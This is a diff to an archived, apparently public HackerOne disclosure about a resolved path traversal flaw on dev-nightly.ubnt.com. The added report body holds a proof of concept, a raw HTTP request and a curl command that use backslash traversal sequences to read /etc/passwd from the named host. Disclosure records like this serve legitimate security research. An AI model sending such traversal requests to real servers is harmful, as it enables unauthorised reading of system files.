@@ -8,6 +8,7 @@ tags:
 substate: "resolved"
 weakness: "Path Traversal"
 enriched: true
+body: true
 date: 2017-09-14
 submitted: 2017-08-15T16:51:21.285Z
 bounty_usd: null
@@ -29,6 +30,25 @@ title: "[dev-nightly.ubnt.com] Local File Reading"
 ## Report summary
 
 `¯\_(ツ)_/¯`
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+**Description**
+Reading files outside the web root via path traversal
+
+**PoC**
+```http
+GET /..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd HTTP/1.1
+Host: dev-nightly.ubnt.com
+```
+```
+curl "https://dev-nightly.ubnt.com/..\..\..\etc\passwd"
+```
+
+**Result**
+{F213057}
 
 ## Timeline
 
